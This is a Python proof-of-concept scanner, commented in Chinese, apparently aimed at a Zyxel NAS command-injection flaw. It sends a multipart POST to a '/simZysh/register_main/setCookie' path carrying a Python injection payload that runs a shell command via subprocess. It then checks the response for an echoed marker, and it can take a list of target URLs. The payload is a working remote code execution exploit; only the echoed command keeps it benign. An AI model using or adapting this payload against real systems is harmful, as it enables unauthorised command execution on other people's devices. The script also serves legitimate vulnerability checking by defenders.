import requests
import argparse

def check_vulnerability(url):
    vul_path = 'cmd,/simZysh/register_main/setCookie'
    full_url = url + vul_path

    # 请求头，请按照你的实际情况修改header头
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryHHaZAYecVOf5sfa6',
    }

    # 要发送的数据内容，记得换行。
    data = (
        "------WebKitFormBoundaryHHaZAYecVOf5sfa6\r\n"
        "Content-Disposition: form-data; name=\"c0\"\r\n"
        "\r\n"
        "storage_ext_cgi CGIGetExtStoInfo None) and False or __import__(\"subprocess\").check_output(\"echo ILoveYaya\", shell=True)#\r\n"
        "------WebKitFormBoundaryHHaZAYecVOf5sfa6--\r\n"
    )

    try:
        # 发送POST请求
        response = requests.post(full_url, headers=headers, data=data, verify=False)

        # 验证返回状态码是否是200，且返回包中包含ILoveYaya
        if response.status_code == 200 and "ILoveYaya" in response.text:
            print(f"漏洞存在: {url}")
        else:
            print(f"漏洞不存在: {url}")

        # 可选：打印响应内容以进行调试，调试时启用
        #print(response.text)
    except requests.RequestException as e:
        print(f"请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测URL是否存在漏洞')
    parser.add_argument('-u', '--url', help='目标URL')
    parser.add_argument('-f', '--file', help='包含URL列表的文件')

    args = parser.parse_args()

    if args.url:
        check_vulnerability(args.url)
    elif args.file:
        try:
            with open(args.file, 'r') as file:
                urls = file.readlines()
                for url in urls:
                    check_vulnerability(url.strip())
        except IOError as e:
            print(f"读取文件失败: {e}")
    else:
        print("请提供URL或包含URL列表的文件")

if __name__ == '__main__':
    main()